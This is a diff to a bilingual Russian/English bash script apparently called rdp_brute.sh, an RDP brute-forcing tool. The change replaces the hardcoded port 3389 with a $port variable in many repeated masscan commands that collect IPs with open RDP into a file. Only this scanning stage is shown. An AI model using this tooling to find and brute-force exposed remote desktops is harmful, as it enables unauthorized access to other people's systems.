 echo -e "$yellow*Для выхода из режима сканирования$red'CTRL+C' $green"
 trap 'echo "Выход в Главное меню"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILERU
 
 
@@ -10854,7 +10858,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                             Search open RDP. Wait$colorbase"
 echo -e "$red-------------------------------------------------------------------------------$green"
 echo -e "$yellow*To exit the scan mode $red'CTRL+C'$green"
-masscan $target -p3389 --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan $target -p $port --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILEEN
 
@@ -10884,7 +10888,7 @@ echo -e "$red-------------------------------------------------------------------
 echo -e "$aquamarine                            Search open RDP. Wait$colorbase"
 echo -e "$red-------------------------------------------------------------------------------$green"
 echo -e "$yellow*To exit the scan mode $red'CTRL+C'$green"
-masscan -p3389 -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL $listname --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 CHECKFILEEN
 
@@ -10942,7 +10946,7 @@ echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -10985,7 +10989,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11030,7 +11034,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11077,7 +11081,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11122,7 +11126,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11168,7 +11172,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11213,7 +11217,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11258,7 +11262,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11302,7 +11306,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11347,7 +11351,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11392,7 +11396,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11437,7 +11441,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11483,7 +11487,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11529,7 +11533,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11575,7 +11579,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11621,7 +11625,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11667,7 +11671,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11713,7 +11717,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11759,7 +11763,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11805,7 +11809,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11851,7 +11855,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11896,7 +11900,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11941,7 +11945,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -11986,7 +11990,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12032,7 +12036,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12077,7 +12081,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12123,7 +12127,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12169,7 +12173,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12215,7 +12219,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12261,7 +12265,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12307,7 +12311,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12353,7 +12357,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12398,7 +12402,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12444,7 +12448,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12489,7 +12493,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12534,7 +12538,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12578,7 +12582,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12624,7 +12628,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12670,7 +12674,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12716,7 +12720,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12762,7 +12766,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12808,7 +12812,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12854,7 +12858,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12900,7 +12904,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12946,7 +12950,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -12992,7 +12996,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13038,7 +13042,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13084,7 +13088,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13130,7 +13134,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13176,7 +13180,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13222,7 +13226,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13268,7 +13272,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13314,7 +13318,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13360,7 +13364,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13406,7 +13410,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13452,7 +13456,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13498,7 +13502,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13544,7 +13548,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
@@ -13590,7 +13594,7 @@ echo ""
 echo -e "$yellow*To exit the scan mode$red'CTRL+C' $green"
 trap 'echo "Return to Main Menu"; ./rdp_brute.sh; exit; ./rdp_brute.sh' 2
 echo ""
-masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+masscan -p $port -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
 CHECKFILEEN
 
 
